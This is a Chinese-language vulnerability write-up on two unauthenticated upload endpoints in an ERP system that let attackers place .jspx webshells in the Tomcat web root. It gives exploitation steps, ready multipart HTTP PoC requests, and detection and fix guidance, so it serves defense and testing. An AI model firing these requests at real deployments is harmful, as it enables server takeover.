---
id: web-generic-file-upload-artery-erp-servletupload-phoneupload
title: Artery ERP 两处未授权文件上传：DiskFileItemFactory 不校验后缀，jspx 落入 webapps/ROOT/attachments
type: scenario
domain: web
path: web/generic/file-upload
technique: erp-servletupload-phoneupload-unrestricted-upload
aliases:
- ServletUpload 任意文件上传
- /upload/uploadImg
- BBSService.phoneUpload
- bbsregisterAttachment 后缀拼接
- ERP 上传 jspx
- 未授权上传 webshell
tags:
- web
- file-upload
- java
- servlet
- erp
- unauth
- webshell
- jspx
- diskfileitemfactory
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:26+08:00'
  notes: 已对照原文核对（33 图）；两入口上传 test.jspx/2.jspx 返回 annexId，attachments 目录截图可见 64801_64801.jspx；未验证访问执行。
---

## 一句话结论

ERP 的 `ServletUpload`（`POST /upload/uploadImg`）与 `BBSService#phoneUpload`（`POST /formservice?service=bbsService.phoneUpload`）都用 `DiskFileItemFactory` 解析 multipart，并把原始文件名的后缀直接拼进落盘文件名，不校验扩展名/内容；上传 `test.jspx` 后文件以 `annexId_annexId.jspx` 落在 `webapps/ROOT/attachments/`，可直接访问执行，形成未授权 webshell 上传。

## 原理

- 两处入口的解析流程一致：
  - `ServletUpload.doPost`：`new DiskFileItemFactory()` → `new ServletFileUpload(fac)` → `parseRequest(req)`，遍历 `FileItem`，对非表单字段取原始 `filename` 作为 `uploadFileName`，调用 `Attachment#bbswriteFileItem(request, fileItem, uploadFileName, "0", true, "BbsContent")`，把返回值拼成 `<annexId>_<uploadFileName>` 写回响应。
  - `BBSService#phoneUpload`：同样 `new ServletFileUpload(new DiskFileItemFactory())`，对每个非表单字段 `URLDecoder.decode(fileItem.getName(),"UTF-8")` 后调用同一个 `bbswriteFileItem`，返回 annexId。
- `bbswriteFileItem` 分配 annexId（`STIDGenerator.allocSystemNo(...)`），取当前存储位置 `place.folder`，调用 `bbsregisterAttachment`：
  - `suffix = filename.substring(filename.lastIndexOf(".")+1)`，即后缀完全取自客户端；
  - `filename = annexId + "." + suffix`，再返回 `annexId + "_" + filename`（实际文件名形如 `64801_64801.jspx`）；
  - 数据写入 `kmtattachment` 表，`saveFile(fileItem, new File(place.folder, realFileName))` 落盘。
- 全程没有扩展名白名单、MIME/魔数校验或内容检查；`place.folder` 指向 Tomcat `webapps/ROOT/attachments/`，`.jspx` 是 XML 形式的 JSP，Web 容器会解析执行其中的 JSP 标签。
- 入口没有有效的 `isAccessible` 鉴权（`/upload/uploadImg` 不带受保护后缀；`bbsService.phoneUpload` 通过 FormService 反射直接调用），因此未登录或低权限用户均可上传。

## 触发条件

- 目标为使用该 ERP/框架的系统，`/upload/uploadImg` 或 `/formservice` 可访问。
- 上传接口未登录即可达（或攻击者拥有任意低权限账号）。
- 上传目录位于 Web 根目录下且容器允许解析 `.jspx`（或 `.jsp` 等脚本后缀）。
- 攻击者能访问/枚举到上传后的文件名与路径（响应返回 annexId/文件名，目录名固定为 `attachments`）。

## 利用步骤

1. 请求 `/upload/uploadImg`，用 multipart 上传一个 `test.jspx`，内容为 JSPX 测试页；观察响应是否返回 `<annexId>_test.jspx`。
2. 按实际命名规则（`annexId_annexId.jspx`）访问 `/attachments/<annexId>_<annexId>.jspx`，确认脚本被解析。
3. 若第一个入口不可用，改用 `POST /formservice?service=bbsService.phoneUpload` 上传同一个文件；响应返回 annexId，按相同规则拼出文件名。
4. 访问上传后的 JSPX 执行命令/写入内存马；必要时结合目录遍历/文件包含链。
5. 记录上传响应、落盘文件名与访问结果，验证后清理。

## PoC

```http
POST /upload/uploadImg HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----1234567890

------1234567890
Content-Disposition: form-data; name="file"; filename="test.jspx"
Content-Type: text/plain

<%@ page contentType="text/xml;charset=UTF-8" %><jsp:scriptlet>out.print("ok");</jsp:scriptlet>
------1234567890--
```

响应（原文）：`64801_test.jspx`；实际落盘文件名形如 `64801_64801.jspx`，位于 `.../tomcat/webapps/ROOT/attachments/`（原文目录截图可见 `64799_64799.jspx`、`64801_64801.jspx`、`64802_64802.jspx` 等）。

```http
POST /formservice?service=bbsService.phoneUpload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----1234567890

------1234567890
Content-Disposition: form-data; name="file"; filename="2.jspx"
Content-Type: text/plain

123
------1234567890--
```

响应 `<root>64802</root>`（annexId），实际文件为 `64802_64802.jspx`。

## 变体与关联

- 变体：后缀改成 `.jsp`、`.jspx`、`.war` 等容器可解析/部署类型；结合解析漏洞、双后缀、MIME 绕过。
- 变体：`bbsregisterAttachment` 的 `filename`/`refid`/`tbname` 参数是否可从其他 public 方法控制，进一步影响数据库记录与落盘路径。
- 关联：FormService 未授权调用机制见 [[web-java-framework-formservice-reflection-dispatch-unauth]]；同系统的任意文件写入 [[web-generic-file-upload-artery-erp-formstudioupdater-uploadstudiofile]]；通用上传原理 [[web-generic-file-upload-extension-zero-check]]。
- 边界：上传目录禁止脚本解析、后缀白名单、文件内容校验、上传接口强制登录或落盘到非 Web 目录时，webshell 不成立；原文只证明文件写入 webroot，未展示访问执行结果。

## 检测与防御

- 检测：`/attachments/` 下出现 `.jspx`/`.jsp` 等脚本文件；上传请求的 filename 为脚本后缀；响应返回 annexId 后紧跟对 `/attachments/` 的访问；`kmtattachment` 表出现异常扩展名记录。
- 修复：上传接口强制登录与权限校验；扩展名白名单 + 内容类型/魔数校验；落盘文件名完全由服务端生成（丢弃客户端后缀）；上传目录移出 Web 根并禁止脚本执行。
- 加固：Tomcat 对 `attachments` 目录关闭 JSP 解析；限制上传大小；对 FormService 增加方法白名单与 `isAccessible` 校验；审计 `bbswriteFileItem`/`bbsregisterAttachment` 的所有调用点。
